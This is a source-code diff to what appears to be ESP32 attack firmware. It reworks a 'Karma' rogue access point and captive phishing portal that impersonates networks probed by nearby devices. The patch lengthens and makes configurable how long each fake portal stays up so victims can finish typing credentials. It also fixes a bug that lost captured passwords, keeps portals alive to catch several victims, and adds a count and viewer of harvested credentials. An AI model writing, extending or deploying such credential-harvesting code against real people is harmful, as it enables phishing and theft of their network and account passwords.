@@ -130,7 +130,14 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 #define LISTEN_WINDOW 250
 #define KARMA_QUEUE_DEPTH 48
 #define PORTAL_HEARTBEAT_INTERVAL 500
-#define PORTAL_MAX_IDLE 60000
+// How long a single ESSID's portal stays up before Karma moves to the next one.
+// Victims need time to read the page and type credentials, so this is the knob
+// that decides whether a capture succeeds at all. It is only the default: the
+// live value is attackConfig.baseDuration, which "Portal Dwell" in the Karma
+// menu rewrites, and the queue expiry and the on-screen countdown follow it.
+#define KARMA_PORTAL_DWELL_MS 300000
+#define KARMA_PORTAL_DWELL_MIN_S 5
+#define KARMA_PORTAL_DWELL_MAX_S 1800
 
 const uint8_t vendorOUIs[][3] PROGMEM = {
     {0x00, 0x50, 0xF2},
@@ -758,6 +765,11 @@ static void destroyActivePortal() {
 #define popularSSIDs (state().popularSSIDs)
 #define pendingPortals (state().pendingPortals)
 
+// Portal dwell lives outside KarmaRuntimeState on purpose: that state is freed
+// when Karma exits, and a dwell picked from the menu should still be in force
+// the next time Karma is started (it resets to the default on reboot).
+static uint32_t gKarmaPortalDwellMs = KARMA_PORTAL_DWELL_MS;
+
 void forceFullRedraw() {
     tft.fillScreen(bruceConfig.bgColor);
     tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
@@ -796,8 +808,7 @@ String generatePortalId(const String &templateName) {
 }
 
 void savePortalCredentials(
-    const String &ssid, const String &identifier, const String &password, const String &mac, uint8_t channel,
-    const String &templateName, const String &portalId
+    const String &ssid, const String &data, const String &mac, uint8_t channel, const String &portalId
 ) {
 
     FS *fs = nullptr;
@@ -813,15 +824,19 @@ void savePortalCredentials(
     String filename = "/PortalCreds/" + portalId + ".txt";
     File file = fs->open(filename, FILE_WRITE);
     if (file) {
+        // The old record split the submission into "Identifier"/"Password",
+        // but neither matched what the victim typed: the identifier was the
+        // literal string "user" and the password held EvilPortal's on-screen
+        // log, whose field names are truncated to three characters ("use:",
+        // "pas:"). Report the form exactly as it was submitted instead, as
+        // name=value pairs, so which field is which is unambiguous.
         file.println("=== PORTAL CAPTURE ===");
         file.printf("Portal: %s\n", portalId.c_str());
         file.printf("Time: %lu\n", millis());
-        file.printf("Template: %s\n", templateName.c_str());
-        file.printf("SSID: %s\n", ssid.c_str());
+        file.printf("Rogue ESSID: %s\n", ssid.c_str());
         file.printf("Client MAC: %s\n", mac.c_str());
         file.printf("Channel: %d\n", channel);
-        file.printf("Identifier: %s\n", identifier.c_str());
-        file.printf("Password: %s\n", password.c_str());
+        file.printf("Data: \"%s\"\n", data.c_str());
         file.println("=====================");
         file.close();
         Serial.printf("[PORTAL] Credentials saved to %s\n", filename.c_str());
@@ -830,17 +845,55 @@ void savePortalCredentials(
     File logFile = fs->open("/PortalCreds/captures_master.txt", FILE_APPEND);
     if (logFile) {
         logFile.printf(
-            "Time:%lu | Portal:%s | SSID:%s | ID:%s | PWD:%s | MAC:%s | CH:%d\n",
+            "Time:%lu | Portal:%s | ESSID:%s | MAC:%s | CH:%d | Data:\"%s\"\n",
             millis(),
             portalId.c_str(),
             ssid.c_str(),
-            identifier.c_str(),
-            password.c_str(),
             mac.c_str(),
-            channel
+            channel,
+            data.c_str()
         );
         logFile.close();
     }
+}
+
+// Counts captured credentials across /BruceEvilCreds/*.csv.
+//
+// That directory is written by EvilPortal::saveToCSV(), one appended line per
+// submitted form, so the line count is the capture count. The Karma menu used
+// to report only on /PortalCreds, which meant it showed "no captures" even when
+// credentials were being harvested correctly.
+static size_t countEvilPortalCreds() {
+    FS *fs = nullptr;
+    if (!getFsStorage(fs)) return 0;
+    if (!fs->exists("/BruceEvilCreds")) return 0;
+
+    File dir = fs->open("/BruceEvilCreds");
+    if (!dir) return 0;
+    if (!dir.isDirectory()) {
+        dir.close();
+        return 0;
+    }
+
+    size_t total = 0;
+    uint8_t buf[128];
+    File entry = dir.openNextFile();
+    while (entry) {
+        String name = String(entry.name());
+        name.toLowerCase();
+        if (!entry.isDirectory() && name.endsWith(".csv")) {
+            int n;
+            while ((n = entry.read(buf, sizeof(buf))) > 0) {
+                for (int i = 0; i < n; i++) {
+                    if (buf[i] == '\n') total++;
+                }
+            }
+        }
+        entry.close();
+        entry = dir.openNextFile();
+    }
+    dir.close();
+    return total;
 }
 
 String generateUniqueFilename(FS &fs, bool compressed) {
@@ -1705,38 +1758,37 @@ void checkPortals() {
         return;
     }
 
-    if (activePortal->instance != nullptr) {
-        activePortal->instance->checkAndExtendDuration();
+    activePortal->instance->checkAndExtendDuration();
 
-        unsigned long portalAge = now - activePortal->launchTime;
+    // Persist credentials as soon as they appear.
+    //
+    // This block used to live at the very end of the function, behind an
+    // "if (hasCredentials()) { destroyActivePortal(); return; }" early return.
+    // ESPAsyncWebServer raises that flag from its own task at an arbitrary
+    // moment between heartbeats, so the early return always won the race and
+    // savePortalCredentials() was effectively dead code -- /PortalCreds was
+    // never even created. Captures only survived because EvilPortal separately
+    // writes /BruceEvilCreds/<template>_creds.csv from credsController().
+    if (activePortal->instance->hasCredentials() && !activePortal->hasCreds) {
+        activePortal->hasCreds = true;
+        activePortal->capturedData = activePortal->instance->getCapturedData();
+        savePortalCredentials(
+            activePortal->ssid,
+            activePortal->capturedData,
+            activePortal->instance->getCapturedClientMac(),
+            activePortal->channel,
+            activePortal->portalId
+        );
+    }
 
-        // If we got credentials, terminate immediately
-        if (activePortal->instance->hasCredentials()) {
-            destroyActivePortal();
-            lastPortalHeartbeat = now;
-            return;
-        }
-
-        // Check if target is engaged (viewed portal recently)
-        bool targetEngaged = activePortal->instance->hasRecentPageView();
-
-        if (targetEngaged) {
-            // Target is actively viewing the portal - keep alive
-            // 3 minute absolute safety cap (180,000 ms)
-            if (portalAge > 180000) { // 3 minutes max
-                destroyActivePortal();
-                lastPortalHeartbeat = now;
-                return;
-            }
-            // Portal stays alive - no timeout when engaged
-        } else {
-            // No engagement - short 15 second timeout
-            if (portalAge > attackConfig.baseDuration) { // 15000 ms (15 seconds)
-                destroyActivePortal();
-                lastPortalHeartbeat = now;
-                return;
-            }
-        }
+    // One predictable deadline instead of the old 15s / 30s-since-page-view
+    // pair. The portal is no longer torn down on the first capture either, so
+    // more than one client on the same ESSID can be served, and it no longer
+    // disappears while a victim is still typing.
+    if (now - activePortal->launchTime > attackConfig.baseDuration) {
+        destroyActivePortal();
+        lastPortalHeartbeat = now;
+        return;
     }
 
     if (channl != activePortal->channel - 1) {
@@ -1746,24 +1798,6 @@ void checkPortals() {
 
     activePortal->instance->processRequests();
     activePortal->lastHeartbeat = now;
-
-    if (activePortal->instance->hasCredentials()) {
-        activePortal->hasCreds = true;
-        activePortal->capturedPassword = activePortal->instance->getCapturedPassword();
-        savePortalCredentials(
-            activePortal->ssid,
-            "user",
-            activePortal->capturedPassword,
-            "unknown",
-            activePortal->channel,
-            activePortal->instance->getApName(),
-            activePortal->portalId
-        );
-        destroyActivePortal();
-        lastPortalHeartbeat = now;
-        return;
-    }
-
     lastPortalHeartbeat = now;
 }
 
@@ -2077,6 +2111,13 @@ void executeTieredAttackStrategy() {
     }
 }
 
+// A queued ESSID is dropped once it has waited for several dwell slots, so the
+// queue does not drain faster than the portals can serve it.
+static unsigned long pendingPortalExpiryMs() {
+    unsigned long expiry = (unsigned long)attackConfig.baseDuration * 3;
+    return expiry < 300000UL ? 300000UL : expiry;
+}
+
 void checkPendingPortals() {
     if (pendingPortals.empty() || !templateSelected || isPortalActive || karmaPaused) return;
     unsigned long now = millis();
@@ -2084,7 +2125,9 @@ void checkPendingPortals() {
         std::remove_if(
             pendingPortals.begin(),
             pendingPortals.end(),
-            [now](const PendingPortal &p) { return (now - p.timestamp > 300000); }
+            [now, expiry = pendingPortalExpiryMs()](const PendingPortal &p) {
+                return (now - p.timestamp > expiry);
+            }
         ),
         pendingPortals.end()
     );
@@ -2491,7 +2534,8 @@ void updateKarmaDisplay() {
 
         if (activePortal != nullptr) {
             unsigned long portalAge = currentTime - activePortal->launchTime;
-            unsigned long portalLeftMs = (portalAge >= PORTAL_MAX_IDLE) ? 0 : (PORTAL_MAX_IDLE - portalAge);
+            unsigned long dwell = attackConfig.baseDuration;
+            unsigned long portalLeftMs = (portalAge >= dwell) ? 0 : (dwell - portalAge);
             unsigned long portalLeftSec = portalLeftMs / 1000;
 
             String portalText = "Active Portal: " + activePortal->ssid;
@@ -2661,8 +2705,8 @@ void karma_setup() {
     attackConfig.fastTierDuration = 15000;
     attackConfig.cloneDuration = 90000;
     attackConfig.maxCloneNetworks = 2;
-    attackConfig.baseDuration = 15000;
-    attackConfig.extendedDuration = 180000;
+    attackConfig.baseDuration = gKarmaPortalDwellMs;
+    attackConfig.extendedDuration = gKarmaPortalDwellMs;
 
     handshakeCaptureEnabled = false;
 
@@ -2765,6 +2809,8 @@ void karma_setup() {
 
             vTaskDelay(200 / portTICK_PERIOD_MS);
 
+            // Built before the vector so the label outlives loopOptions().
+            String dwellLabel = "Portal Dwell: " + String(attackConfig.baseDuration / 1000) + "s";
             std::vector<Option> options = {
                 {"Enhanced Stats",
                  [&]() {
@@ -2804,6 +2850,49 @@ void karma_setup() {
                      screenNeedsRedraw = true;
                  }                   },
 
+                {dwellLabel.c_str(),
+                 [&]() {
+                     // Seconds the rogue AP + portal are offered for one ESSID
+                     // before Karma tears it down and moves to the next queued
+                     // one. Long enough to fill in a form beats covering more
+                     // ESSIDs: the ESP32 has a single softAP, so only one ESSID
+                     // can be impersonated at a time.
+                     auto applyDwell = [](uint32_t seconds) {
+                         if (seconds < KARMA_PORTAL_DWELL_MIN_S) seconds = KARMA_PORTAL_DWELL_MIN_S;
+                         if (seconds > KARMA_PORTAL_DWELL_MAX_S) seconds = KARMA_PORTAL_DWELL_MAX_S;
+                         gKarmaPortalDwellMs = seconds * 1000;
+                         attackConfig.baseDuration = gKarmaPortalDwellMs;
+                         attackConfig.extendedDuration = gKarmaPortalDwellMs;
+                         // The live portal follows the new deadline too, so the
+                         // change is not stuck behind the current ESSID.
+                         if (activePortal != nullptr && activePortal->instance != nullptr) {
+                             activePortal->instance->setBaseDuration(seconds);
+                             activePortal->instance->setExtendedDuration(seconds);
+                         }
+                         displayTextLine("Dwell: " + String(seconds) + "s");
+                         delay(1000);
+                     };
+
+                     std::vector<Option> dwellOptions = {
+                         {                                             "30 seconds",                                             [&]() { applyDwell(30); }},
+                         {                                             "60 seconds",                                             [&]() { applyDwell(60); }},
+                         {                           "2 minutes",                                            [&]() { applyDwell(120); }},
+                         {                                                              "5 minutes (default)",                                             [&]() { applyDwell(300); }},
+                         {                                                              "10 minutes",                                            [&]() { applyDwell(600); }},
+                         {                                             "Custom...",
+                 [&]() {
+                              String typed = num_keyboard(
+                                  String(attackConfig.baseDuration / 1000), 4, "Seconds per ESSID:"
+                              );
+                              if (typed.isEmpty()) return;
+                              applyDwell((uint32_t)typed.toInt());
+                          }},
+                         {                                             "Back",                                             [&]() {}}
+                     };
+                     loopOptions(dwellOptions);
+                     screenNeedsRedraw = true;
+                 }                                     },
+
                 {"Rotate MAC Now",
                  [&]() {
                      generateRandomBSSID(currentBSSID);
@@ -2816,7 +2905,7 @@ void karma_setup() {
                 {"Set Mode",
                  [&]() {
                      std::vector<Option> modeOptions = {
-                         {                                                              "Passive (Listen only)",
+                         {"Passive (Listen only)",
                  [&]() {
                               karmaMode = MODE_PASSIVE;
                               broadcastAttack.stop();
@@ -2824,7 +2913,7 @@ void karma_setup() {
                               displayTextLine("Passive mode");
                               delay(1000);
                           }},
-                         {                           "Broadcast (Advertise SSIDs)",
+                         {"Broadcast (Advertise SSIDs)",
                  [&]() {
                               karmaMode = MODE_BROADCAST;
                               if (!karmaPaused) {
@@ -2834,7 +2923,7 @@ void karma_setup() {
                               displayTextLine("Broadcast mode");
                               delay(1000);
                           }},
-                         {                                             "Full (Both)",
+                         {"Full (Both)",
                  [&]() {
                               karmaMode = MODE_FULL;
                               if (!karmaPaused) {
@@ -2844,16 +2933,16 @@ void karma_setup() {
                               displayTextLine("Full mode");
                               delay(1000);
                           }},
-                         {                                             "Back",                                             [&]() {}}
+                         {"Back", [&]() {}}
                      };
                      loopOptions(modeOptions);
                      screenNeedsRedraw = true;
-                 }                                     },
+                 }                   },
 
                 {"Channel Control",
                  [&]() {
                      std::vector<Option> channelOptions = {
-                         {                                             "Next Channel",
+                         {"Next Channel",
                  [&]() {
                               if (!karmaPaused) esp_wifi_set_promiscuous(false);
                               channl++;
@@ -2864,7 +2953,7 @@ void karma_setup() {
                               displayTextLine("Channel: " + String(karma_channels[channl % 14]));
                               delay(1000);
                           }},
-                         {                                             "Previous Channel",
+                         {"Previous Channel",
                  [&]() {
                               if (!karmaPaused) esp_wifi_set_promiscuous(false);
                               if (channl == 0) channl = 13;
@@ -2895,7 +2984,7 @@ void karma_setup() {
                          {"Back", [&]() {}}
                      };
                      loopOptions(channelOptions);
-                 }                                    },
+                 }                   },
 
                 {"Attack Settings",
                  [&]() {
@@ -3070,9 +3159,9 @@ void karma_setup() {
                      karmaOptions.push_back({"Back", [&]() {}});
                      loopOptions(karmaOptions);
                      screenNeedsRedraw = true;
-                 }                                    },
+                 }},
 
-                {"Select Template", [&]() { selectPortalTemplate(false); }                                     },
+                {"Select Template", [&]() { selectPortalTemplate(false); }                                    },
 
                 {"Attack Strategy",
                  [&]() {
@@ -3120,7 +3209,7 @@ void karma_setup() {
                          {"Back", [&]() {}}
                      };
                      loopOptions(strategyOptions);
-                 }                                    },
+                 }                                     },
 
                 {"Active Broadcast Attack",
                  [&]() {
@@ -3206,11 +3295,23 @@ void karma_setup() {
                      );
                      broadcastOptions.push_back({"Back", [&]() {}});
                      loopOptions(broadcastOptions);
-                 }                   },
+                 }                                    },
 
                 {"View Captures",
                  [&]() {
+                     // Built before the vector so the label outlives loopOptions().
+                     String credsLabel = "Creds: " + String(countEvilPortalCreds());
                      std::vector<Option> viewOptions = {
+                         {credsLabel.c_str(),
+                 [&]() {
+                              FS *fs;
+                              if (getFsStorage(fs) && fs->exists("/BruceEvilCreds")) {
+                                  loopSD(*fs, false, "CSV", "/BruceEvilCreds");
+                              } else {
+                                  displayTextLine("No captures yet");
+                                  delay(1000);
+                              }
+                          }},
                          {"Portal Creds",
                  [&]() {
                               FS *fs;
@@ -3234,7 +3335,7 @@ void karma_setup() {
                          {"Back", [&]() {}}
                      };
                      loopOptions(viewOptions);
-                 }                   },
+                 }},
 
                 {"Save Probes",
                  [&]() {
@@ -3244,14 +3345,14 @@ void karma_setup() {
                          displayTextLine("Probes saved!");
                      } else displayTextLine("No storage!");
                      delay(1000);
-                 }                   },
+                 }                                     },
 
                 {"Clear Probes",
                  [&]() {
                      clearProbes();
                      displayTextLine("Probes cleared!");
                      delay(1000);
-                 }                   },
+                 }                                    },
 
                 {"Show Stats",
                  [&]() {
@@ -3280,9 +3381,9 @@ void karma_setup() {
                          delay(50);
                      }
                      screenNeedsRedraw = true;
-                 }},
+                 }                                     },
 
-                {"Exit Karma", [&]() { returnToMenu = true; }                                     },
+                {"Exit Karma", [&]() { returnToMenu = true; }                   },
             };
 
             loopOptions(options);
